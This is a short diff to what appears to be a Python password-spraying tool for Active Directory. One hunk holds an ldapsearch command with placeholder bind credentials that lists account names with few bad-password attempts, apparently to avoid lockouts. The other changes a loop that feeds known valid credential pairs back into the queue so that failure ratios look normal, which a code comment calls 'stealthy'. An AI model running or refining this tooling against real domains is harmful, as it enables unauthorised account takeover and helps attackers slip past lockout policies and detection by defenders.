@@ -49,7 +49,7 @@ class userThread(threading.Thread):
 		return None
 
 def ldap_search(filter=""):
-	cmd = 'ldapsearch -h X.X.X.X -b dc=example,dc=local -x "(&(objectClass=user)(samaccountname=*)(badpwdcount<=1))" -D user_200@example.local -w password123!  -E pr=500000/noprompt "samaccountname" | egrep -io "samaccountname: .+" | cut -d " " -f2 '
+	cmd = 'ldapsearch -h x.x.x.x -b dc=example,dc=local -x "(&(objectClass=user)(samaccountname=*)(badpwdcount<=1))" -D user_200@example.local -w password123!  -E pr=500000/noprompt "samaccountname" | egrep -io "samaccountname: .+" | cut -d " " -f2 '
 	raw_output = runBash(cmd)
 	s = set()
 	for user in raw_output:
@@ -179,7 +179,8 @@ def main():
 						while fail_perc >= 0.75:
 							# Start pushing known valid cred pairs into queue to 
 							# influence the fail:success ratio - stealthy eh?
-							for credpair in loot["success"]:
+							enumerated_creds = loot["success"].copy()
+							for credpair in enumerated_creds:
 								ldap_tribute = min(ldap_qcount, key=ldap_qcount.get)
 								ldap_qcount[ldap_tribute] += 1
 								poll_list.append(userThread(credpair[0], credpair[1], domain, ldap_servers[ldap_tribute], ldap_tribute))
